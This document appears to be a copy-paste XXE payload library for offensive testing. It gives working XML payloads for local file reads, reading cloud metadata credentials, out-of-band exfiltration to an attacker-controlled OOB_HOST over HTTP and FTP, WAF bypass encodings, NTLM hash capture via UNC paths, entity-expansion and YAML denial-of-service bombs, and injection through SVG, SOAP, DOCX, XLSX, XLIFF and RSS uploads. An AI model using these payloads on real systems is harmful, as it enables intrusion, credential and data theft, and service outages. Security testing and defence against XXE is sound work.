# XXE payload library (file-read / SSRF / OOB / error / DoS / per-format) — Open WHEN: you have a confirmed XML sink (DOCTYPE accepted or entity expanded) and need a copy-paste body for a specific channel or upload format

The SKILL body already holds the canonical one-liners for `file:///etc/passwd`,
the ECS `169.254.170.2` creds, the `evil.dtd` OOB chain, the
`file:///nonexistent/%file;` error chain, `php://filter` of `index.php`,
billion-laughs and quadratic-blowup. Everything below is the *non-overlapping*
variant set: alternate framings, formats, and exfil channels.

## File read — variant framings the body does not show

`SYSTEM` with no `file://` scheme (relative-looking path still resolves):
```xml
<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM "/etc/passwd">]><data>&file;</data>
```
One-liner, `ISO-8859-1`, explicit `ANY`:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
Windows `boot.ini` (older hosts) — body only shows `win.ini`:
```xml
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```
`PUBLIC` is interchangeable with `SYSTEM` (second literal is the URL):
```xml
<!ENTITY xxe PUBLIC "Any TEXT" "file:///etc/passwd">
```

### Directory listing (Java parsers)
Java returns a listing when the entity points at a directory, not a file:
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///"><root><foo>&xxe;</foo></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
Pivot: list a dir first to learn exact config filenames, then read them.

## SSRF — internal HTTP target (non-cloud)
```xml
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >]><foo>&xxe;</foo>
```
Cloud IMDS path (rotate paths; the body covers ECS, this is plain IMDSv1 EC2):
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## Basic blind / OOB confirmation (general entity, no DTD)
Quickest "is it blind-vulnerable" probe before the full parameter-entity dance:
```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://OOB_HOST/x'>]><root>&test;</root>
```
Parameter-entity ping (works when general entities are stripped):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://OOB_HOST/p"> %xxe; ]>
<stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>
```
Single-file inline exfil (returns first line only on multi-line files):
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "http://OOB_HOST/?%xxe;">
]><foo>&callhome;</foo>
```

## OOB exfil via external DTD — the variant chains
External-DTD declared on the DOCTYPE line (Yunusov form), DTD on your host:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://OOB_HOST/oob.dtd"><data>&send;</data>
```
`oob.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://OOB_HOST/?%file;'>">
%all;
```
PHP-filter variant inside the remote DTD (base64 survives binary/newlines):
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM "http://OOB_HOST/dtd.xml">%sp;%param1;]>
<r>&exfil;</r>
```
`dtd.xml`:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://OOB_HOST/dtd.xml?%data;'>">
```
DTD-only control (MITM / you control only the external DTD, not the body):
```xml
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://OOB_HOST/x=%payload;">'>
%param1;
%external;
```
FTP exfil retrieves *multi-line* files HTTP truncates — serve with
`xxeserv -o files.log -p 2121 -w -wd public -wp 8000` (staaldraad/xxeserv) and
point `%param1` at `ftp://OOB_HOST:2121/%data;`.

## Error-based — remote-DTD form (body has only inline form)
Trigger body:
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [<!ENTITY % ext SYSTEM "http://OOB_HOST/ext.dtd"> %ext;]><message></message>
```
`ext.dtd` (nonexistent-path concat — file content lands in the exception):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Alternative concat that abuses an invalid scheme prefix:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

## WAF / filter bypass payloads (concrete strings)

`data://` base64 (decodes to `file:///etc/passwd` — only if `data://` allowed):
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
UTF-7 DOCTYPE (defeats filters that string-match `<!DOCTYPE`/`<!ENTITY`):
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://OOB_HOST:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
UTF-16 conversion to slip past UTF-8-only WAF rules:
```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```
HTML-numeric-entity nested DTD declaration (entity-inside-entity to load a DTD):
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data><env>&exfil;</env></data>
```
paired `bypass.dtd`:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://OOB_HOST:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
JSON→XML flip: switch `Content-Type: application/json` to `application/xml` and
re-serialize the JSON object as a single-root XML doc (every key becomes a tag),
then inject DOCTYPE — a non-well-formed body just yields a `SAXParseException`.

## Windows NTLM-hash capture (UNC path)
Stand up an SMB listener (`responder`), then force outbound SMB auth:
```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///OOB_HOST//share/random.jpg'> ]>
<data>&example;</data>
```
The captured NetNTLM hash is then crackable offline (`hashcat`).

## DoS — variants beyond billion-laughs / quadratic (body already has those)
Parameters-laugh (parameter-entity delayed-interpretation, Pipping) — slips
entity-*count* limits that block classic billion-laughs:
```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]><r/>
```
YAML alias-expansion bomb (for YAML import sinks reached via the same form):
```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
```

## Per-format entry points

### SVG (server-side rasterizer / image preview)
Classic file-read — first line of the file renders *inside* the produced image,
so you must fetch the rendered output:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
`xlink:href` file-read (no entity needed):
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
OOB via SVG rasterization (`xxe.svg` body + remote `xxe.xml` DTD):
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % sp SYSTEM "http://OOB_HOST:8080/xxe.xml">%sp;%param1;]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg"><flowRoot><flowDiv><flowPara>&exfil;</flowPara></flowDiv></flowRoot></svg>
```
`xxe.xml`:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://OOB_HOST:2121/%data;'>">
```

### SOAP (inject DTD via CDATA in a body field)
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://OOB_HOST:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

### DOCX / OOXML
OOXML is a ZIP. Inject into any XML part; common targets:
`/word/document.xml`, `/_rels/.rels`, `[Content_Types].xml`,
`/ppt/presentation.xml`. Repackage and upload:
```bash
zip -u poc.docx word/document.xml   # update one part in place
```

### XLSX
Inject the blind payload into `xl/workbook.xml` (or `xl/sharedStrings.xml`):
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://OOB_HOST:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
```
Remote `xxe.dtd` (swap the file path without rebuilding the doc; FTP for big files):
```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://OOB_HOST:2121/%d;'>">
```
Repackage — MUST use `zip -u`, never `7z`/`7za` (those break the magic bytes and
many spreadsheet libs reject the file as `Microsoft OOXML` instead of `Excel 2007+`):
```bash
cd XXE && zip -r -u ../xxe.xlsx *
```

### XLIFF (`.xliff`, CAT-tool / localization import)
Multipart upload, `Content-Type: application/x-xliff+xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [<!ENTITY % remote SYSTEM "http://OOB_HOST/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
```
Java 1.8 can't OOB-exfil files with newlines — fall back to the error-based DTD:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```

### RSS / Atom feed import
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0"><channel><title>x</title><item><title>&xxe;</title></item></channel></rss>
```
PHP source read via base64 filter inside the same feed shape:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/index.php" >
```
